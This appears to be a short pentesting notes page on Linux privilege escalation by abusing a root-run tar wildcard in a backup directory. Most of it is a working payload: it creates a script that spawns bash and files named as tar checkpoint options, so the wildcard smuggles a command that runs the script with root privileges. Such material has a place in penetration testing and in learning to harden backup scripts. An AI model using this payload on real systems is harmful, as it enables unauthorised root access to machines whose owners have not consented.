# ✳️ Sudo Tar Wildcard

<figure><img src="../../../.gitbook/assets/Linux Privilege Escalation-12 (1).png" alt=""><figcaption></figcaption></figure>

If such scripts are found we can make a payload:

```
cd /opt/backup
echo -e '#!/bin/bash\n/bin/bash' > shell.sh
echo "" > "--checkpoint-action=exec=sh shell.sh"
echo "" > --checkpoint=1
```

Now we get bash script when the script is ran with root.
